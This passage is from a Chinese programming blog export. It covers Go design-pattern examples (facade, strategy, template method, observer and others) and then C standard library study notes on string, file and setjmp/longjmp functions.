使用代理类不关心内部painter实现，并且不用关心是否需要初始化</span></span><br><span class="line">	p := PainterProxy&#123;&#125;</span><br><span class="line">	p.DrawCircle()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-享元模式"><a href="#10-享元模式" class="headerlink" title="10. 享元模式"></a>10. 享元模式</h3><p>运用共享技术有效地支持大量的细粒度对象</p>
<h3 id="11-外观（门面）模式"><a href="#11-外观（门面）模式" class="headerlink" title="11. 外观（门面）模式"></a>11. 外观（门面）模式</h3><p>为一组接口提供一个一致的接口，体现了DIP和LoD原则</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个基础接口，外部不可见</span></span><br><span class="line"><span class="keyword">type</span> drawer <span class="keyword">interface</span> &#123;</span><br><span class="line">	draw()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承基础接口定义画圆</span></span><br><span class="line"><span class="keyword">type</span> circle <span class="keyword">struct</span> &#123;</span><br><span class="line">	drawer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *circle)</span></span> draw() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;draw circle&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承基础接口定义画矩形</span></span><br><span class="line"><span class="keyword">type</span> square <span class="keyword">struct</span> &#123;</span><br><span class="line">	drawer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *square)</span></span> draw() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;draw square&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义外观模型，将画圆和画矩形封装起来</span></span><br><span class="line"><span class="keyword">type</span> Facade <span class="keyword">struct</span> &#123;</span><br><span class="line">	circleDrawer circle</span><br><span class="line">	squareDrawer square</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现画圆的接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *Facade)</span></span> DrawCircle() &#123;</span><br><span class="line">	<span class="keyword">if</span> f.circleDrawer.drawer == <span class="literal">nil</span> &#123;</span><br><span class="line">		f.circleDrawer = circle&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	f.circleDrawer.draw()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现画矩形的接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *Facade)</span></span> DrawSquare() &#123;</span><br><span class="line">	<span class="keyword">if</span> f.squareDrawer.drawer == <span class="literal">nil</span> &#123;</span><br><span class="line">		f.squareDrawer = square&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	f.squareDrawer.draw()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	facade := &amp;Facade&#123;&#125;</span><br><span class="line">	facade.DrawCircle()</span><br><span class="line">	facade.DrawSquare()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="12-桥接模式"><a href="#12-桥接模式" class="headerlink" title="12. 桥接模式"></a>12. 桥接模式</h3><p>将抽象部分与其实现部分分离，使它们都可以独立变化，可实现多角度分类</p>
<h2 id="C．行为型模式"><a href="#C．行为型模式" class="headerlink" title="C．行为型模式"></a>C．行为型模式</h2><h3 id="13-策略模式"><a href="#13-策略模式" class="headerlink" title="13. 策略模式"></a>13. 策略模式</h3><ul>
<li>定义一种策略，比如从A到B</li>
<li>使用多个方法进行实现此策略，比如飞机、汽车、走路</li>
<li>使用者自己选择方法，调用同一个策略进行执行</li>
<li>本质是封装公共的调用逻辑和方法，如超市的接口方法为算要付多少钱，但是存在不同的策略，如打几折，满多少送多少等</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义策略接口，公共方法为执行策略</span></span><br><span class="line"><span class="keyword">type</span> Strategy <span class="keyword">interface</span> &#123;</span><br><span class="line">	run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义策略A继承策略</span></span><br><span class="line"><span class="keyword">type</span> StrategyA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Strategy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义策略B继承策略</span></span><br><span class="line"><span class="keyword">type</span> StrategyB <span class="keyword">struct</span> &#123;</span><br><span class="line">	Strategy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现具体的执行策略的方式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StrategyA)</span></span> run() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;StrategyA&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现具体的执行策略的方式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StrategyB)</span></span> run() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;StrategyB&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对外仅有一个公共的执行策略的流程，如调用run</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RunStrategy</span><span class="params">(s Strategy)</span></span> &#123;</span><br><span class="line">	s.run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 使用策略A，调用公共执行流程</span></span><br><span class="line">	strategy.RunStrategy(&amp;strategy.StrategyA&#123;&#125;)</span><br><span class="line">	<span class="comment">// 使用策略B，调用公共执行流程</span></span><br><span class="line">	strategy.RunStrategy(&amp;strategy.StrategyB&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-模板方法模式"><a href="#14-模板方法模式" class="headerlink" title="14. 模板方法模式"></a>14. 模板方法模式</h3><p>定义一个操作中算法的骨架，而将一些具体步骤延迟到子类</p>
<ul>
<li>可以认为是一个模板类实现了公共的逻辑，子类只需要实现非公用逻辑即可</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">type</span> Product <span class="keyword">interface</span> &#123;</span><br><span class="line">	Use()</span><br><span class="line">	Print()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义模板继承</span></span><br><span class="line"><span class="keyword">type</span> ProductTemplate <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义产品A，继承模板</span></span><br><span class="line"><span class="keyword">type</span> ProductA <span class="keyword">struct</span> &#123;</span><br><span class="line">	ProductTemplate</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义产品B，继承模板</span></span><br><span class="line"><span class="keyword">type</span> ProductB <span class="keyword">struct</span> &#123;</span><br><span class="line">	ProductTemplate</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板实现公共接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *ProductTemplate)</span></span> Print() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;name&quot;</span>, p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *ProductA)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;ProductA use&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *ProductB)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;ProductB use&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	p := ProductA&#123;</span><br><span class="line">		ProductTemplate: ProductTemplate&#123;</span><br><span class="line">			Name: <span class="string">&quot;ProductA&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	p.Use()</span><br><span class="line">	p.Print()</span><br><span class="line">	p1 := ProductB&#123;</span><br><span class="line">		ProductTemplate: ProductTemplate&#123;</span><br><span class="line">			Name: <span class="string">&quot;ProductB&quot;</span>,</span><br><span class="line">		&#125;&#125;</span><br><span class="line">	p1.Use()</span><br><span class="line">	p1.Print()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="15-观察者模式-发布-订阅模式"><a href="#15-观察者模式-发布-订阅模式" class="headerlink" title="15. 观察者模式(发布-订阅模式)"></a>15. 观察者模式(发布-订阅模式)</h3><p>定义一种一对多的依赖关系，让多个观察者对象同时监听某一个通知者对象</p>
<img src="2020-07-12-01.png"/>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个产品，内部存在一个观察者列表</span></span><br><span class="line"><span class="keyword">type</span> Product <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name         <span class="type">string</span></span><br><span class="line">	observerList []Observer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义观察者接口</span></span><br><span class="line"><span class="keyword">type</span> Observer <span class="keyword">interface</span> &#123;</span><br><span class="line">	Update(product *Product)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Product)</span></span> AddObserver(observer Observer) &#123;</span><br><span class="line">	p.observerList = <span class="built_in">append</span>(p.observerList, observer)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Product)</span></span> SetName(name <span class="type">string</span>) &#123;</span><br><span class="line">	p.Name = name</span><br><span class="line">	<span class="comment">// 名字变化后，通知所有观察者</span></span><br><span class="line">	<span class="keyword">for</span> _, observer := <span class="keyword">range</span> p.observerList &#123;</span><br><span class="line">		observer.Update(p)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个观察者A</span></span><br><span class="line"><span class="keyword">type</span> ObserverA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Observer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现更新方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *ObserverA)</span></span> Update(product *Product) &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;ObserverA: %s\n&quot;</span>, product.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个观察者B</span></span><br><span class="line"><span class="keyword">type</span> ObserverB <span class="keyword">struct</span> &#123;</span><br><span class="line">	Observer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *ObserverB)</span></span> Update(product *Product) &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;ObserverB: %s\n&quot;</span>, product.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建一个产品</span></span><br><span class="line">	product := &amp;Product&#123;&#125;</span><br><span class="line">	<span class="comment">// 创建观察者A</span></span><br><span class="line">	observerA := &amp;ObserverA&#123;&#125;</span><br><span class="line">	<span class="comment">// 创建观察者B</span></span><br><span class="line">	observerB := &amp;ObserverB&#123;&#125;</span><br><span class="line">	<span class="comment">// 将观察者A添加到产品中</span></span><br><span class="line">	product.AddObserver(observerA)</span><br><span class="line">	<span class="comment">// 将观察者B添加到产品中</span></span><br><span class="line">	product.AddObserver(observerB)</span><br><span class="line">	<span class="comment">// 修改产品名字</span></span><br><span class="line">	product.SetName(<span class="string">&quot;productA&quot;</span>)</span><br><span class="line">	<span class="comment">// 修改产品名字</span></span><br><span class="line">	product.SetName(<span class="string">&quot;productB&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-迭代器模式"><a href="#16-迭代器模式" class="headerlink" title="16. 迭代器模式"></a>16. 迭代器模式</h3><p>提供顺序访问一个聚合中元素的方法。不常用，因为语言本身已内置</p>
<h3 id="17-职责链模式"><a href="#17-职责链模式" class="headerlink" title="17. 职责链模式"></a>17. 职责链模式</h3><p>使多个对象都有机会获得机会处理请求。这些对象连成一条链。减少请求得与接收者的耦合。如过滤器</p>
<h3 id="18-命令模式"><a href="#18-命令模式" class="headerlink" title="18. 命令模式"></a>18. 命令模式</h3><p>将请求封装成一个对象，以使你可用不同的请求对客户端进行参数化；可对请求进行排除、记录日志、或撤销操作</p>
<h3 id="19-备忘录模式"><a href="#19-备忘录模式" class="headerlink" title="19. 备忘录模式"></a>19. 备忘录模式</h3><p>在不破坏封装的前提下捕获一个对象的内部状态，并在该对象外部保存此状态</p>
<h3 id="20-状态模式"><a href="#20-状态模式" class="headerlink" title="20. 状态模式"></a>20. 状态模式</h3><p>当一个状态改变时，允许改变其行为，看其来像是改变了其类。（将复杂的条件判断转移到多个小类中）</p>
<h3 id="21-访问者模式"><a href="#21-访问者模式" class="headerlink" title="21. 访问者模式"></a>21. 访问者模式</h3><p>表示一个作用于某对象结构中的各元素的操作。把数据处理与数据结构分开</p>
<h3 id="22-解释器模式"><a href="#22-解释器模式" class="headerlink" title="22. 解释器模式"></a>22. 解释器模式</h3><p>对一个语言定义一个文法的表示，并定义一个解释器，来解释语言中的句子，如正则表达式，浏览器。通过解释执行</p>
<h3 id="23-中介者-调停者-模式"><a href="#23-中介者-调停者-模式" class="headerlink" title="23. 中介者(调停者)模式"></a>23. 中介者(调停者)模式</h3><p>用一个中介对象来封装一系列的对象交互。应用于星形结构的对象关系中</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/blogs/2018-09-18-CStudy/</url>
    <content><![CDATA[<h1 id="一、C标准库"><a href="#一、C标准库" class="headerlink" title="一、C标准库"></a>一、C标准库</h1><h2 id="1-stdio-h"><a href="#1-stdio-h" class="headerlink" title="1. stdio.h"></a>1. stdio.h</h2><h3 id="1-1-字符串格式化输出函数-snprintf"><a href="#1-1-字符串格式化输出函数-snprintf" class="headerlink" title="1.1. 字符串格式化输出函数 snprintf()"></a>1.1. 字符串格式化输出函数 snprintf()</h3><p>函数原型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">int</span> <span class="title">snprintf</span> <span class="params">(<span class="type">char</span> *__restrict __s, <span class="type">size_t</span> __maxlen,<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>snprintf是指定长度的格式化输出</li>
<li>返回值为format拼接的长度，不是被写入后字符串的长度</li>
<li>其中的<code>__maxlen</code>可以指定为<code>sizeof(__s)</code>，snprintf只会写入<code>__maxlen - 1</code>的字符，并在最后拼接<code>\0</code></li>
</ul>
<h3 id="1-2-文件操作"><a href="#1-2-文件操作" class="headerlink" title="1.2. 文件操作"></a>1.2. 文件操作</h3><h4 id="1-函数原型"><a href="#1-函数原型" class="headerlink" title="1) 函数原型"></a>1) 函数原型</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __filename, <span class="type">const</span> <span class="type">char</span> *__restrict __modes)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从文件中读取固定长度内容</span></span><br><span class="line"><span class="comment"> * @param __ptr 储存地址</span></span><br><span class="line"><span class="comment"> * @param __size 元素大小</span></span><br><span class="line"><span class="comment"> * @param __n 元素个数</span></span><br><span class="line"><span class="comment"> * @param __stream 文件句柄</span></span><br><span class="line"><span class="comment"> * @return 读取的元素个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">fread</span> <span class="params">(<span class="type">void</span> *__restrict __ptr, <span class="type">size_t</span> __size, <span class="type">size_t</span> __n, FILE *__restrict __stream)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fclose</span> <span class="params">(FILE *__stream)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="2-string-h"><a href="#2-string-h" class="headerlink" title="2. string.h"></a>2. string.h</h2><h3 id="2-1-输出家族函数"><a href="#2-1-输出家族函数" class="headerlink" title="2.1. 输出家族函数"></a>2.1. 输出家族函数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>; <span class="comment">//输出到标准输出</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>; <span class="comment">//输出到文件</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>; <span class="comment">//输出到字符串str中</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span>; <span class="comment">//按size大小输出到字符串str中</span></span><br></pre></td></tr></table></figure>

<p>以下函数功能与上面的一一对应相同，只是在函数调用时，把上面的…对应的一个个变量用<code>va_list</code>调用所替代。在函数调用前ap要通过<code>va_start()</code>宏来动态获取。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vprintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vfprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vsprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>format格式说明</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%s</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> str = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> str5 = <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.5s\r\n&quot;</span>, str);        <span class="comment">//&#x27;abcde&#x27; 只显示前五个字符</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.10s\r\n&quot;</span>, str5);      <span class="comment">//&#x27;abcde&#x27; 不足10个只打印5个</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5.3s\r\n&quot;</span>, str);       <span class="comment">//&#x27;  abc&#x27; 最少占用5个字符宽度，只打印3个，右对齐</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%-5.3s\r\n&quot;</span>, str);      <span class="comment">//&#x27;abc  &#x27; 最少占用5个字符宽度，只打印3个，左对齐</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3.5s\r\n&quot;</span>, str);       <span class="comment">//&#x27;abcde&#x27; 最少占用3个字符宽度，打印5个，3的限制失效</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10s\r\n&quot;</span>, str);        <span class="comment">//&#x27;abcdefghijklmnopqrstuvwxyz&#x27; 最少占用10个字符宽度，打印26个，10的限制失效</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-字符串拷贝-strncpy"><a href="#2-2-字符串拷贝-strncpy" class="headerlink" title="2.2. 字符串拷贝 strncpy()"></a>2.2. 字符串拷贝 strncpy()</h3><p>函数原型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title">strncpy</span> <span class="params">(<span class="type">char</span> *__restrict __dest, <span class="type">const</span> <span class="type">char</span> *__restrict __src, <span class="type">size_t</span> __n)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>strncpy拷贝字符串，会检测<code>__src</code>里面的结束符，只拷贝到结束符</li>
<li><strong><font color="red">如果<code>__src</code>长度大于<code>__n</code>，将拷贝<code>__n</code>个字符到<code>__dest</code>，不会赋值结尾<code>\0</code>，需要手动赋值</font></strong></li>
<li><strong><font color="red">如果<code>__src</code>长度小于<code>__n</code>，将拷贝<code>strlen(__src)</code>个字符到<code>__dest</code>，剩余空间赋值<code>\0</code></font></strong></li>
</ul>
<h3 id="2-3-初始化函数-memset"><a href="#2-3-初始化函数-memset" class="headerlink" title="2.3. 初始化函数 memset()"></a>2.3. 初始化函数 memset()</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将n bytes起始地址为s的内存全部初始化为c</span></span><br><span class="line"><span class="comment"> * @param __s 初始化地址</span></span><br><span class="line"><span class="comment"> * @param __c 初始化的值</span></span><br><span class="line"><span class="comment"> * @param __n 初始化的大小</span></span><br><span class="line"><span class="comment"> * @return __s的地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memset</span> <span class="params">(<span class="type">void</span> *__s, <span class="type">int</span> __c, <span class="type">size_t</span> __n)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数是按byte(8 bits)进行初始化的，每个字节均会被初始化为<code>__c</code>取前八位的值。</strong></p>
<h3 id="2-4-字符串拷贝-strdup"><a href="#2-4-字符串拷贝-strdup" class="headerlink" title="2.4. 字符串拷贝 strdup()"></a>2.4. 字符串拷贝 strdup()</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 拷贝字符串到空指针里，附带内存申请，注意指针原来指向的地址需要先free</span></span><br><span class="line"><span class="comment"> * @_Src 要拷贝的字符串</span></span><br><span class="line"><span class="comment"> * @return 申请后拷贝到的地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">char</span> *__cdecl <span class="title">strdup</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_Src)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="2-5-字符串比较函数-strcmp和strncpm"><a href="#2-5-字符串比较函数-strcmp和strncpm" class="headerlink" title="2.5. 字符串比较函数 strcmp和strncpm"></a>2.5. 字符串比较函数 strcmp和strncpm</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 比较字符串，返回比较的值</span></span><br><span class="line"><span class="comment"> * @_Str1 要对比的字符串</span></span><br><span class="line"><span class="comment"> * @_Str2 要对比的字符串</span></span><br><span class="line"><span class="comment"> * @return 遇到&#x27;\0&#x27;或者不一样的字符串为止，第一个不一样的字符对比大小</span></span><br><span class="line"><span class="comment"> *          &#x27;a&#x27;  &gt; &#x27;\0&#x27;,     1;</span></span><br><span class="line"><span class="comment"> *          &#x27;\0&#x27; &lt; &#x27;a&#x27;,     -1;</span></span><br><span class="line"><span class="comment"> *          &#x27;a&#x27;  &gt; &#x27;b&#x27;,      1;</span></span><br><span class="line"><span class="comment"> *          &#x27;b&#x27;  &lt; &#x27;a&#x27;,     -1;</span></span><br><span class="line"><span class="comment"> *          &#x27;\0&#x27; &lt; &#x27;\0&#x27;,     0;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_Str1,<span class="type">const</span> <span class="type">char</span> *_Str2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多了大小限制，防止内存泄漏</span></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_Str1,<span class="type">const</span> <span class="type">char</span> *_Str2, <span class="type">size_t</span> _MaxCount)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-setjmp"><a href="#3-setjmp" class="headerlink" title="3. setjmp"></a>3. setjmp</h2><h3 id="3-1-非局部跳转函数-setjmp-longjmp"><a href="#3-1-非局部跳转函数-setjmp-longjmp" class="headerlink" title="3.1. 非局部跳转函数 setjmp()&#x2F;longjmp()"></a>3.1. 非局部跳转函数 setjmp()&#x2F;longjmp()</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 设置返回位置</span></span><br><span class="line"><span class="comment"> * @param __env 保存状态信息的缓存地址</span></span><br><span class="line"><span class="comment"> * @return 直接调用返回，0；调用longjmp后返回longjmp给入参数__val</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setjmp</span> <span class="params">(jmp_buf __env)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 跳转到setjmp的位置</span></span><br><span class="line"><span class="comment"> * @param __env 跳转位置的状态信息</span></span><br><span class="line"><span class="comment"> * @param __val 跳转位置返回值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">longjmp</span> <span class="params">(jmp_buf __env, <span class="type">int</span> __val)</span></span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;csetjmp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rainbow</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rainbow</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Rainbow()&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Rainbow</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;~Rainbow()&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jmp_buf kansas;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">oz</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Rainbow rb;</span><br><span class="line">    <span class="built_in">longjmp</span>(kansas, <span class="number">47</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> code = <span class="built_in">setjmp</span>(kansas);</span><br><span class="line">    <span class="keyword">if</span> ((code = <span class="built_in">setjmp</span>(kansas)) == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Setjmp code &quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">oz</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Setjmp code &quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
